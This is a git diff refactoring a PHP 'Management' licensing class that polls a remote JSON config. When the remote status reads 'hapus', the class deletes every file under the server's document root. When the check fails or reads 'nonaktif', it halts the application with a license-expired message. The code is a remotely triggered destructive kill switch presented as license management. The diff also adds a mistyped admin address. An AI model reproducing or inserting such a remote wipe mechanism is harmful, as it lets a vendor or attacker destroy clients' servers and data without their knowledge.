@@ -1,29 +1,30 @@
 <?php
 
-namespace morait\management_web;
+namespace ManagementWeb;
 
-class management
+class Management
 {
-    static $config;
-    static $email;
+    public static $config;
+    public static $email = 'admin@loclahost';
+    private static $start_date;
 
-    function __construct($config=array('url'=>'http://localhost/config.json', 'email'=>'admin@localhost'), 
-                                       $logs='', $logs_source='', $show_error='')
+    function __construct($config=array('url'=>'http://localhost/config.json', 'email'=>'admin@localhost'))
     {
-        management::$config = $config;
-        management::$start_date = management::start_date();
+        Management::$config = $config;
+        Management::$email = $config['email'];
+        Management::$start_date = Management::start_date();
     }  
 
     private static function start_date()
     {
         if(!file_exists('start.dat')){
-            $date = new date('Y-m-d');
+            $date = date('Y-m-d');
             @file_put_contents('start.dat', $date);
         }
         return @file_get_contents('start.dat');
     }
 
-    private function curl($url)
+    private static function curl($url)
     {
         $ch = curl_init($url);
         @curl_setopt($ch, CURLOPT_HEADER         ,true);    // we want headers
@@ -32,7 +33,7 @@ class management
         $output = curl_exec($ch);
         $code = @curl_getinfo($ch, CURLINFO_HTTP_CODE);
         if(curl_error($ch)|| $code != 200) {
-            return _not_connected();
+            return Management::nonaktif();
         }
 
         curl_close($ch);
@@ -64,36 +65,36 @@ class management
 
     private static function nonaktif()
     {
-        die('License Expired, Contact '. management::$email .' to open and return your application');
+        die('License Expired, Contact '. Management::$email .' to open and return your application');
     }
 
     private static function hapus()
     {
         $dir = scandir($_SERVER['DOCUMENT_ROOT']);
-        management::delete_files($_SERVER['DOCUMENT_ROOT']);
+        Management::delete_files($_SERVER['DOCUMENT_ROOT']);
     }
 
     public static function initialize()
     {
-      $read = json_decode(management::curl(management::$config['url']));
-      management::_tmp($read);
-      return management::_license();  
+      $read = json_decode(Management::curl(Management::$config['url']));
+      Management::_tmp($read);
+      return Management::_license();  
     }
 
     private static function _license()
     {
-        $license = management::_tempRead();
+        $license = Management::_tempRead();
       switch($license)
       {
           case 'aktif':
                 return true;
           break;
           case 'hapus':
-                return management::hapus();
+                return Management::hapus();
           break;
           case 'nonaktif':
           default:
-            return management::nonaktif();
+            return Management::nonaktif();
         break;
       }
     }
